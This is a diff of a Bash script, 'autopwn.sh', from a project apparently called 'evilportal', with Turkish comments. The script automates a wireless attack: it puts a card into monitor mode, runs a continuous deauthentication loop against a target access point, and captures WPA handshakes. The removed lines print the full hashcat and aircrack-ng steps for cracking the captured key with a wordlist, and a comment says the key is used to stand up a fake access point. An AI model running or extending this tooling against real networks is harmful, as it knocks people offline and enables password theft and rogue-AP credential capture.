@@ -1,135 +1,159 @@
 #!/usr/bin/env bash
 # ==============================================================
-#  evilportal — WPA handshake yakala + kır
-#  Bulunan PSK'yi capture/psk.txt'e yazar.
+#  evilportal — WPA handshake yakala
+#  Yakalanan handshake'i capture/handshake_<BSSID>.cap'e yazar.
 #
 #  Kullanım:
-#    sudo ./autopwn.sh [BSSID] [KANAL] [SSID] [WORDLIST] [IFACE] [TIMEOUT]
+#    sudo ./autopwn.sh [BSSID] [KANAL] [SSID] [IFACE] [TIMEOUT]
 #
 #  Akış:
-#    monitor mode → airodump-ng + deauth döngüsü → handshake →
-#    hashcat (varsa) / aircrack-ng → PSK
+#    monitor mode → airodump-ng + deauth döngüsü → handshake yakalandı
+#
+#  Çıkışta arayüz eskisi gibi managed moda döner, NetworkManager geri açılır.
 # ==============================================================
 set -uo pipefail
 
 BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 source "$BASE/config.sh"
+source "$BASE/lib.sh"
 
 BSSID="${1:-$TARGET_BSSID}"
 CHAN="${2:-$CHANNEL}"
 SSID="${3:-$TARGET_SSID}"
-WORDLIST="${4:-${WORDLIST:-/usr/share/wordlists/rockyou.txt}}"
-IFACE="${5:-$MON_IF}"
-TIMEOUT="${6:-${CAPTURE_TIMEOUT:-60}}"
+IFACE="${4:-$MON_IF}"
+TIMEOUT="${5:-${CAPTURE_TIMEOUT:-60}}"
 
-log(){ echo "[*] $*"; }
-ok(){  echo "[+] $*"; }
-err(){ echo "[-] $*"; }
+log(){  echo "[*] $*"; }
+ok(){   echo "[+] $*"; }
+err(){  echo "[-] $*"; }
+warn(){ echo "[!] $*"; }
 
 [[ $EUID -eq 0 ]] || { err "root gerekli"; exit 1; }
 
-for b in airodump-ng aireplay-ng aircrack-ng; do
-  command -v "$b" >/dev/null 2>&1 || { err "$b yok — apt install aircrack-ng"; exit 1; }
+for b in airodump-ng aireplay-ng aircrack-ng iw; do
+  command -v "$b" >/dev/null 2>&1 || {
+    err "$b yok — sudo apt install aircrack-ng iw"; exit 1;
+  }
 done
 
-[[ -r "$WORDLIST" ]] || {
-  err "wordlist okunamıyor: $WORDLIST"
-  [[ -e "${WORDLIST}.gz" ]] && err "sıkıştırılmış: gunzip ${WORDLIST}.gz"
-  exit 1
+[[ "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || {
+  err "geçersiz BSSID: '$BSSID'"; exit 1;
 }
+[[ "$CHAN" =~ ^[0-9]+$ ]] || { err "geçersiz kanal: '$CHAN'"; exit 1; }
+(( CHAN >= 1 && CHAN <= 196 )) || { err "kanal aralık dışı: $CHAN"; exit 1; }
+[[ "$TIMEOUT" =~ ^[0-9]+$ ]] || { err "geçersiz zaman aşımı: '$TIMEOUT'"; exit 1; }
+(( TIMEOUT >= 5 )) || { err "zaman aşımı en az 5 sn olmalı"; exit 1; }
+
+iw dev "$IFACE" info >/dev/null 2>&1 || { err "arayüz yok: '$IFACE'"; exit 1; }
 
 WORK="$BASE/capture/hs_$(printf '%s' "$BSSID" | tr -d ':')"
 rm -rf "$WORK"
 mkdir -p "$WORK" "$BASE/capture"
-rm -f "$BASE/capture/psk.txt"
 
 log "hedef      : $SSID ($BSSID), kanal $CHAN"
 log "arayüz     : $IFACE"
-log "wordlist   : $WORDLIST"
 log "zaman aşımı: ${TIMEOUT}s"
 
+# -------------------------------------------------------------- monitor
 airmon-ng check kill >/dev/null 2>&1 || true
-ip link set "$IFACE" down 2>/dev/null
-iw dev "$IFACE" set type monitor 2>/dev/null
-ip link set "$IFACE" up
-iw dev "$IFACE" set channel "$CHAN" 2>/dev/null || { err "kanal $CHAN ayarlanamadı"; exit 1; }
-iw dev "$IFACE" set power_save off 2>/dev/null || true
+ORIG_IF="$IFACE"
+if ! MON=$(ep_set_monitor "$IFACE"); then
+  err "$IFACE monitor mode'a alınamadı — kart desteklemiyor olabilir"
+  exit 1
+fi
+IFACE="$MON"
+log "monitor    : $IFACE"
 
+iw dev "$IFACE" set channel "$CHAN" 2>/dev/null || {
+  err "kanal $CHAN ayarlanamadı"; exit 1;
+}
+
+# -------------------------------------------------------------- temizlik
 DUMP=""
 DEAUTH=""
-cleanup(){
+CLEANED=0
+
+cleanup() {
+  [[ "$CLEANED" == "1" ]] && return 0
+  CLEANED=1
+
   if [[ -n "$DEAUTH" ]]; then
     pkill -P "$DEAUTH" 2>/dev/null
     kill "$DEAUTH" 2>/dev/null
+    DEAUTH=""
   fi
-  [[ -n "$DUMP" ]] && kill "$DUMP" 2>/dev/null
+  if [[ -n "$DUMP" ]]; then
+    kill "$DUMP" 2>/dev/null
+    DUMP=""
+  fi
   wait 2>/dev/null
+
+  # arayüzleri normale döndür
+  if [[ "$IFACE" != "$ORIG_IF" ]]; then
+    ep_drop_vif "$IFACE"
+  fi
+  ep_restore_iface "$ORIG_IF"
+  ep_nm_restart
 }
 trap cleanup EXIT INT TERM
 
+# -------------------------------------------------------------- yakalama
 log "airodump-ng başlıyor"
 airodump-ng -c "$CHAN" --bssid "$BSSID" --output-format pcap \
   -w "$WORK/cap" "$IFACE" > "$WORK/airodump.log" 2>&1 &
 DUMP=$!
 
-log "deauth döngüsü başlıyor"
+log "deauth döngüsü başlıyor (hedefe bağlı istemci olmalı)"
 (
+  n=0
   while :; do
     aireplay-ng --deauth 5 -a "$BSSID" "$IFACE" >/dev/null 2>&1
+    (( n++ % 5 == 0 )) && iw dev "$IFACE" set channel "$CHAN" >/dev/null 2>&1
     sleep 2
   done
 ) &
 DEAUTH=$!
 
 CAPFILE=""
+check_capture() {
+  local f="$1"
+  aircrack-ng "$f" 2>/dev/null | grep -qE "[1-9][0-9]* handshake" && return 0
+  grep -qi "WPA handshake:" "$WORK/airodump.log" 2>/dev/null
+}
+
 for ((i = 1; i <= TIMEOUT; i++)); do
   sleep 1
+  (( i % 2 == 1 )) && continue
+
   for f in "$WORK"/cap*.cap; do
-    [[ -e "$f" ]] || continue
-    if aircrack-ng "$f" 2>/dev/null | grep -qE "[1-9][0-9]* handshake"; then
+    [[ -s "$f" ]] || continue
+    if check_capture "$f"; then
       CAPFILE="$f"
       break 2
     fi
   done
-  (( i % 10 == 0 )) && log "${i}s… handshake yok"
+
+  (( i % 10 == 0 )) && log "${i}s… handshake yok (deauth sürüyor)"
 done
 
 if [[ -z "$CAPFILE" ]]; then
   err "handshake yakalanamadı (${TIMEOUT}s)"
-  err "AP'ye bağlı aktif bir istemci gerekir; kanal/SSID'yi doğrula"
+  err "hedefe bağlı aktif bir istemci yoksa deauth handshake üretmez"
+  err "kanal/SSID doğru mu? 802.11w (PMF) aktif olabilir"
   exit 2
 fi
 
 ok "handshake yakalandı: $(basename "$CAPFILE")"
 cleanup
-trap - EXIT INT TERM
+trap cleanup EXIT INT TERM
 
-log "kırma başlıyor…"
-PSK=""
-
-if command -v hashcat >/dev/null 2>&1 && command -v hcxpcapngtool >/dev/null 2>&1; then
-  if hcxpcapngtool -o "$WORK/hs.22000" "$CAPFILE" >/dev/null 2>&1 && [[ -s "$WORK/hs.22000" ]]; then
-    log "hashcat (-m 22000) kullanılıyor"
-    hashcat -m 22000 "$WORK/hs.22000" "$WORDLIST" \
-      --potfile-path "$WORK/hs.pot" --quiet > "$WORK/hashcat.log" 2>&1
-    PSK=$(hashcat -m 22000 "$WORK/hs.22000" --show \
-      --potfile-path "$WORK/hs.pot" 2>/dev/null | head -n1 | cut -d: -f2-)
-  fi
+if [[ ! -s "$CAPFILE" ]]; then
+  err "capture dosyası boş: $CAPFILE"
+  exit 2
 fi
 
-if [[ -z "$PSK" ]]; then
-  log "aircrack-ng kullanılıyor"
-  RESULT=$(aircrack-ng -w "$WORDLIST" -b "$BSSID" "$CAPFILE" 2>/dev/null | grep -i "KEY FOUND")
-  PSK=$(printf '%s' "$RESULT" | sed -n 's/.*\[\(.*\)\].*/\1/p')
-fi
+KEEP="$BASE/capture/handshake_$(printf '%s' "$BSSID" | tr -d ':').cap"
+cp -f "$CAPFILE" "$KEEP" 2>/dev/null && log "kopya: $KEEP"
 
-if [[ -z "$PSK" ]]; then
-  err "PSK bulunamadı — wordlist yetersiz"
-  err "daha büyük veya hedefe özel bir wordlist dene"
-  exit 3
-fi
-
-printf '%s' "$PSK" > "$BASE/capture/psk.txt"
 echo
-ok "PSK=$PSK"
-ok "capture/psk.txt yazıldı — sahte AP bu parola ile açılabilir"
+ok "handshake capture/$(basename "$KEEP") dosyasına kaydedildi"
